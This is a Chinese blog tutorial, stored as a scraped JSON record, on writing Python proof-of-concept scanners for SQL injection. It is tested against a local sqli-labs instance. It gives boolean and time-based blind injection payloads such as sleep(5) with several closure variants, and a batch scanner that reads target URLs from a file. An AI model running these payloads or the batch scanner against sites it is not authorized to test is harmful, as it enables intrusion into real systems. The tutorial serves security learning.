{"blogid": "123190514", "writerAge": "码龄2年", "writerBlogNum": "28", "writerCollect": "47", "writerComment": "40", "writerFan": "16", "writerGrade": "2级", "writerIntegral": "357", "writerName": "马戏团小丑", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_123190514.jpg", "writerRankTotal": "42188", "writerRankWeekly": "82979", "writerThumb": "28", "writerVisitNum": "44195", "blog_read_count": "3234", "blog_time": "于 2022-03-02 13:47:11 发布", "blog_title": "python之poc编写——sql篇", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><a href=\"#sql_4\">sql注入漏洞漏扫</a></li><li><ul><li><a href=\"#sql_5\">单个网站基础sql扫描</a></li><li><a href=\"#sql_35\">多个网站sql基础扫描</a></li><li><ul><li><a href=\"#_67\">时间盲注型扫描</a></li><li><a href=\"#sql_97\">升阶版sql批量扫描</a></li></ul>\n</li></ul>\n</li></ul>\n</div>\n<br/> poc:即验证漏洞是否存在的脚本，也就是扫描器\n<br/> 兄弟们，开始写扫描器啦\n<p></p>\n<h1><a id=\"sql_4\"></a>sql注入漏洞漏扫</h1>\n<h2><a id=\"sql_5\"></a>单个网站基础sql扫描</h2>\n<p>第一步，当然是写request函数啦。除了时间盲注外，<code>1' and 1=2%23</code>就能判断字符型的sql注入</p>\n<pre><code class=\"prism language-py\"><span class=\"token comment\">#!/usr/bin/python</span>\n<span class=\"token comment\"># encoding = utf-8</span>\n\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">def</span> <span class=\"token function\">poc</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tresult_rep <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>result_rep<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n\theader <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"User_Agent\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Firefox/50.0\"</span><span class=\"token punctuation\">}</span><span class=\"token comment\">#http头，随便写一个装装样子</span>\n\turl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://127.0.0.1/sqli-labs-master/Less-8/?id=1\"</span>\n\t\n\tresult_lens <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token comment\">#创建空列表用于比对后面and判断的返回包长度</span>\n\trep <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span>header<span class=\"token punctuation\">)</span>\n\tnormal_len <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rep<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token comment\">#正常请求，也就是if判断正确时应该返回的数据包长度</span>\n\tpayloads <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"\\'%20and%201=1%23\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\'%20and%201=2%23\"</span><span class=\"token punctuation\">]</span><span class=\"token comment\">#通过单引号and 1=2来验证，用Url编码了空格</span>\n\t<span class=\"token keyword\">for</span> payload <span class=\"token keyword\">in</span> payloads<span class=\"token punctuation\">:</span>\n\t\tresult_len <span class=\"token operator\">=</span> poc<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span>payload<span class=\"token punctuation\">)</span><span class=\"token comment\">#发包</span>\n\t\tresult_lens<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>result_len<span class=\"token punctuation\">)</span>\n\t\t\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>result_lens<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> normal_len <span class=\"token operator\">&amp;</span> normal_len <span class=\"token operator\">!=</span> result_lens<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#表示and 1=1是正确返回包的长度，而and 1=2是错误的返回包长度，也就是说单引号后的内容被mysql正确的执行</span>\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">\"exists SQL Injection!\"</span>\n\t\t\n</code></pre>\n<p>ok，一个很辣鸡的poc产生了，我相信知道sql注入原理的伙伴看到这些个注释没可能读不懂这个脚本</p>\n<p>那批量扫描呢？</p>\n<h2><a id=\"sql_35\"></a>多个网站sql基础扫描</h2>\n<p>当然是读文件啦<br/> 对上述代码进行改良：</p>\n<pre><code class=\"prism language-py\"><span class=\"token comment\">#!/usr/bin/python</span>\n<span class=\"token comment\"># encoding = utf-8</span>\n\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">def</span> <span class=\"token function\">poc</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tresult_rep <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>result_rep<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#把main里进行sql检验的代码进行重复调用，把这段代码写进run函数</span>\n\tresult_lens <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\trep <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span>header<span class=\"token punctuation\">)</span>\n\tnormal_len <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rep<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n\tpayloads <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"\\'%20and%201=1%23\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\'%20and%201=2%23\"</span><span class=\"token punctuation\">]</span>\n\t<span class=\"token keyword\">for</span> payload <span class=\"token keyword\">in</span> payloads<span class=\"token punctuation\">:</span>\n\t\tresult_len <span class=\"token operator\">=</span> poc<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span>payload<span class=\"token punctuation\">)</span>\n\t\tresult_lens<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>result_len<span class=\"token punctuation\">)</span>\n\t\t\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>result_lens<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> normal_len <span class=\"token operator\">&amp;</span> normal_len <span class=\"token operator\">!=</span> result_lens<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">\"exists SQL Injection!\"</span>\n\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n\theader <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"User_Agent\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Firefox/50.0\"</span><span class=\"token punctuation\">}</span>\n\turls <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#将每一行的信息保存到列表里</span>\n<span class=\"token keyword\">for</span> url <span class=\"token keyword\">in</span> urls<span class=\"token punctuation\">:</span>\n\trun<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token comment\">#对url.txt内的网址批量用数据包长度比对方式进行扫描</span>\n</code></pre>\n<p>现在将待扫网址写入url.txt中即可批量扫描，但是如果是时间盲注，那用数据返回包的长度就不能判断有无sql注入漏洞了</p>\n<h3><a id=\"_67\"></a>时间盲注型扫描</h3>\n<p>这种扫描就适用于没有过滤且为字符型的所有注入，要用到上一博客讲到的Exception进行异常判断,加在poc校验内。那都用sleep来判断了，result_len就没用了，直接删掉</p>\n<pre><code class=\"prism language-py\"><span class=\"token comment\">#!/usr/bin/python</span>\n<span class=\"token comment\"># encoding = utf-8</span>\n\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">def</span> <span class=\"token function\">poc</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t<span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n\t\tresult_rep <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\t\tresult <span class=\"token string\">\"no sql injection\"</span>\n\t<span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token string\">\"timeout\"</span><span class=\"token comment\">#如果sleep了，就存在sql注入漏洞</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\trep <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span>header<span class=\"token punctuation\">)</span>\n\tpayloads <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"\\'%20and%20sleep(5)%23\"</span><span class=\"token punctuation\">]</span>\n\t<span class=\"token keyword\">for</span> payload <span class=\"token keyword\">in</span> payloads<span class=\"token punctuation\">:</span>\n\t\tresult_info <span class=\"token operator\">=</span> poc<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span>payload<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"timeout\"</span> <span class=\"token keyword\">in</span> result_info<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">\"exist sql injection!\"</span>\n\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n\theader <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"User_Agent\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Firefox/50.0\"</span><span class=\"token punctuation\">}</span>\n\turls <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#将每一行的信息保存到列表里</span>\n<span class=\"token keyword\">for</span> url <span class=\"token keyword\">in</span> urls<span class=\"token punctuation\">:</span>\n\trun<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token comment\">#对url.txt内的网址批量用数据包长度比对方式进行扫描</span>\n\t\t\t\n</code></pre>\n<p><img alt=\"py脚本扫描结果\" src=\"..\\..\\static\\image\\0ee9c94dbb554c42805e202007147817.png\"/></p>\n<h3><a id=\"sql_97\"></a>升阶版sql批量扫描</h3>\n<p>上述脚本存在误报，就是payload只有一个单引号闭合，没办法检验数字型sql，双引号型，’)型，’))等<br/> 在payload中多加几个类型</p>\n<pre><code class=\"prism language-py\">payloads <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"\\'%20and%20sleep(5)%23\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\\"%20and%20sleep(5)%23\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"%20and%20sleep(5)%23\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\')%20and%20sleep(5)%23\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\'))%20and%20sleep(5)%23\"</span><span class=\"token punctuation\">]</span>\n</code></pre>\n<p><img alt=\"正确的批量扫描\" src=\"..\\..\\static\\image\\c81e832b315640f2bc2670e5eb615f89.png\"/>http头注入和waf注入poc下一节来讲</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "SQL", "cpp": 0, "csharp": 0, "python": 1, "javascript": 0, "java": 0, "sql": 1, "php": 0, "time": "2022-03-02 13:47:11", "summary": "文章目录注入漏洞漏扫单个网站基础扫描多个网站基础扫描时间盲注型扫描升阶版批量扫描即验证漏洞是否存在的脚本，也就是扫描器兄弟们，开始写扫描器啦注入漏洞漏扫单个网站基础扫描第一步，当然是写函数啦。除了时间"}